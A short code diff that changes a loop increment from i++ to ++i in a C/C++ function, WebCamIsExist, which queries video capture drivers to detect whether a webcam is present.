@@ -56,7 +56,7 @@ BOOL WebCamIsExist()
 	BOOL	bOk = FALSE;
 
 	char	szDeviceName[100], szVer[50];
-	for (int i = 0; i < 10 && !bOk; i++)
+	for (int i = 0; i < 10 && !bOk; ++i)
 	{
 		bOk = capGetDriverDescription(i, szDeviceName, sizeof(szDeviceName),     
 			//系统的API函数
